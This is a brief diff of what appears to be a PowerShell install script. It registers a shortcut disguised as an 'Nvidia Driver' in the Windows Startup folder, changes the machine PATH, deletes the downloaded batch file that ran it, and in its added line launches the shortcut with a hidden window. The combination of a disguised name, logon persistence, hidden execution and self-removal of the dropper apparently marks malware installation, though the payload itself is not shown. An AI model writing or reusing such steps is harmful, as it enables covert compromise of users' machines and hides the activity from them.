@@ -8,3 +8,4 @@ $Path = [Environment]::GetEnvironmentVariable("PATH", "Machine")+';C:\Program Fi
 [Environment]::SetEnvironmentVariable( "Path", $Path, "Machine" )
 cp "C:\Program Files\NVIDIA Graphics Drivers\Nvidia Driver.lnk" "C:\Users\$username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 del C:\Users\$username\Downloads\first.bat
+Start-Process "C:\Program Files\NVIDIA Graphics Drivers\Nvidia Driver.lnk"  -WindowStyle Hidden
